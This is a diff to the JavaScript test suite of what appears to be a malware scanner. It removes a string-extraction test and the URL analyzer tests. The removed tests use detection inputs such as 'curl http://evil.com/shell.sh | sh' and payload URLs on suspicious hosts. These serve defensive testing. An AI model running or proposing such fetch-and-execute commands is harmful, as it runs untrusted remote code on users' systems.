@@ -4,8 +4,7 @@ const path = require('path');
 // Source imports (compiled JS from out/)
 const Severity = require('../../out/scanner/models/severity');
 const { shannonEntropy, findHighEntropyStrings } = require('../../out/scanner/analyzers/entropy-analyzer');
-const { extractStringLiterals, countHexStrings, countBase64Strings, countEvalUsage, countExecUsage, detectStringArrayObfuscation } = require('../../out/scanner/analyzers/string-analyzer');
-const { extractUrls, findSuspiciousUrls, findPipedExecution } = require('../../out/scanner/analyzers/url-analyzer');
+const { countHexStrings, countBase64Strings, countEvalUsage, countExecUsage, detectStringArrayObfuscation } = require('../../out/scanner/analyzers/string-analyzer');
 const { checkTyposquat } = require('../../out/scanner/analyzers/typosquat-analyzer');
 const { executeRule } = require('../../out/rules/rule-engine');
 const { RuleLoader } = require('../../out/rules/rule-loader');
@@ -101,12 +100,6 @@ suite('Shannon Entropy', () => {
 });
 
 suite('String Analyzer', () => {
-  test('extractStringLiterals finds quoted strings', () => {
-    const literals = extractStringLiterals('"hello" + "world"');
-    assert.strictEqual(literals.length, 2);
-    assert.strictEqual(literals[0].value, 'hello');
-    assert.strictEqual(literals[1].value, 'world');
-  });
 
   test('countHexStrings with 0 long hex', () => {
     assert.strictEqual(countHexStrings('short hex'), 0);
@@ -158,49 +151,6 @@ suite('String Analyzer', () => {
   test('detectStringArrayObfuscation false for small array', () => {
     const small = '["a","b","c"];';
     assert.strictEqual(detectStringArrayObfuscation(small), false);
-  });
-});
-
-suite('URL Analyzer', () => {
-  test('extractUrls finds http/https URLs', () => {
-    const urls = extractUrls('const url = "https://example.com/api";');
-    assert(urls.length >= 1);
-    assert(urls[0].url.includes('example.com'));
-  });
-
-  test('extractUrls ignores non-url strings', () => {
-    const urls = extractUrls('no urls here');
-    assert.strictEqual(urls.length, 0);
-  });
-
-  test('findSuspiciousUrls catches suspicious domains', () => {
-    const findings = findSuspiciousUrls('const u = "https://malware.vercel.app/payload"');
-    assert(findings.length > 0);
-  });
-
-  test('findSuspiciousUrls catches raw IP addresses', () => {
-    const findings = findSuspiciousUrls('const u = "http://192.168.1.100/payload"');
-    assert(findings.length > 0);
-  });
-
-  test('findSuspiciousUrls ignores 127.0.0.1', () => {
-    const findings = findSuspiciousUrls('const u = "http://127.0.0.1:3000/local"');
-    assert.strictEqual(findings.length, 0);
-  });
-
-  test('findSuspiciousUrls ignores known-safe ip 0.0.0.0', () => {
-    const findings = findSuspiciousUrls('const u = "http://0.0.0.0:8080/local"');
-    assert.strictEqual(findings.length, 0);
-  });
-
-  test('findPipedExecution finds curl | sh', () => {
-    const results = findPipedExecution('curl http://evil.com/shell.sh | sh');
-    assert(results.length > 0);
-  });
-
-  test('findPipedExecution returns empty for clean code', () => {
-    const results = findPipedExecution('const x = 1 + 2');
-    assert.strictEqual(results.length, 0);
   });
 });
 
